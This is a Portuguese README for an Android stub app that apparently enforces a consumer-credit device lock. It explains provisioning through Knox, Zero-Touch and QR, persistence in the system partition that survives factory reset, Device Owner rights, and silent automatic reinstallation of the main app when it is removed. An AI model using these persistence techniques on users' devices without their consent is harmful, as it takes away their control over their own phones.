# CDC Credit Smart Stub App

## Status: ATIVO

O módulo Stub está implementado e pronto para uso com os seguintes mecanismos de enrollment:
- **Samsung Knox Mobile Enrollment (KME)** - Totalmente suportado
- **Android Zero-Touch Enrollment** - Configuração pendente
- **QR Code DPC** - Fallback universal

## O que é o Stub App?

O Stub App é um APK minimalista (~500KB) que pode ser instalado como **app de sistema** via Knox KME, Zero-Touch Enrollment, ou acordo OEM. Por estar na partição do sistema (`/system/priv-app/`), ele sobrevive ao factory reset.

## Função Principal

1. **Detectar boot** - Quando o dispositivo inicia
2. **Verificar app principal** - Se CDC App está instalado
3. **Reinstalar automaticamente** - Baixar e instalar silenciosamente (Device Owner)
4. **Monitorar remoção** - Se o app for desinstalado, reinstala

## Arquitetura

```
┌─────────────────────────────────────────────────────────┐
│                    FACTORY RESET                        │
└─────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────┐
│  CDC LOADER STUB (sobrevive ao reset)                   │
│  • Pré-instalado via OEM/EMM/Zero-Touch                 │
│  • APK minimalista (~500KB)                             │
│  • Registra-se como Device Owner automaticamente        │
└─────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────┐
│  1. Verifica conectividade de rede                      │
│  2. Baixa CDC APK completo (CDN ou Google Play)         │
│  3. Instala silenciosamente (PackageInstaller API)      │
│  4. Inicia CDC App com dados de enrollment              │
│  5. CDC sincroniza status via hardware ID               │
└─────────────────────────────────────────────────────────┘
```

## Componentes

| Arquivo | Função |
|---------|--------|
| `StubApplication.kt` | Configuração e inicialização |
| `StubDeviceAdminReceiver.kt` | Device Admin/Owner receiver |
| `BootCompletedReceiver.kt` | Detecta boot e verifica app |
| `PackageRemovedReceiver.kt` | Detecta remoção do app principal |
| `MainAppReinstallJobService.kt` | JobService para reinstalação |
| `SilentPackageInstaller.kt` | Instalação via PackageInstaller API |
| `StubPreferences.kt` | Preferências criptografadas |
| `StubContentProvider.kt` | Comunicação com app principal |
| `InstallResultReceiver.kt` | Callback de instalação |

## Modos de Instalação

### 1. Instalação Silenciosa (Device Owner)
Quando o stub é Device Owner:
- Usa `PackageInstaller.Session` API
- Instalação completamente silenciosa
- Sem interação do usuário
- Ideal para MDM

### 2. Instalação com Prompt (Fallback)
Quando não é Device Owner:
- Abre tela de instalação do Android
- Requer toque do usuário
- Funciona em qualquer dispositivo

## Compilar

```bash
# Debug APK
./gradlew :stub:assembleDebug

# Release APK (assinado)
./gradlew :stub:assembleRelease

# Copiar para assets do app principal
./gradlew :stub:copyStubApkToAssets
```

## URL de Download do APK Principal

O APK principal é baixado automaticamente da seguinte URL:
```
https://bppprhrpqncihfxfcsip.supabase.co/storage/v1/object/public/Plug/apk/app-release.apk
```

## Configuração Knox KME

```json
{
  "package_name": "com.cdccreditsmart.stub",
  "install_location": "priv-app",
  "device_owner": true,
  "auto_start": true,
  "apk_url": "https://bppprhrpqncihfxfcsip.supabase.co/storage/v1/object/public/Plug/apk/app-release.apk",
  "signature_hash": "SHA256_DO_CERTIFICADO"
}
```

## Configuração Zero-Touch Enrollment

```json
{
  "android.app.extra.PROVISIONING_DEVICE_ADMIN_COMPONENT_NAME": 
    "com.cdccreditsmart.stub/.StubDeviceAdminReceiver",
  "android.app.extra.PROVISIONING_DEVICE_ADMIN_PACKAGE_DOWNLOAD_LOCATION": 
    "https://bppprhrpqncihfxfcsip.supabase.co/storage/v1/object/public/Plug/apk/app-release.apk",
  "android.app.extra.PROVISIONING_DEVICE_ADMIN_SIGNATURE_CHECKSUM": 
    "SHA256_CHECKSUM"
}
```

## Comunicação Stub ↔ App Principal

### Stub armazena dados de enrollment:
- `deviceId` - ID único do dispositivo
- `contractCode` - Código do contrato
- `serialNumber` - Serial number do dispositivo
- `apkUrl` - URL para download do APK principal

### App principal registra dados no stub:
```kotlin
val uri = Uri.parse("content://com.cdccreditsmart.stub.provider/enrollment")
val values = ContentValues().apply {
    put("device_id", deviceId)
    put("contract_code", contractCode)
}
contentResolver.insert(uri, values)
```

## Compatibilidade Multi-OEM

Consulte `docs/OEM_ENROLLMENT_MATRIX.md` para detalhes sobre compatibilidade com cada fabricante:
- Samsung (KME)
- Xiaomi/Redmi (Mi Enterprise)
- Oppo/Realme (HeyTap)
- Infinix/Tecno/Itel (Transsion)
- LG, Motorola, Nokia (Android Enterprise)

## Requisitos de Segurança

1. **Verificação de Assinatura** - APK principal verificado antes de instalar
2. **TLS Obrigatório** - Todas as comunicações via HTTPS
3. **Hardware ID** - Identificadores de hardware para vincular dispositivo
4. **Criptografia** - Dados de enrollment em EncryptedSharedPreferences

---

*Última atualização: 2025-12-08*
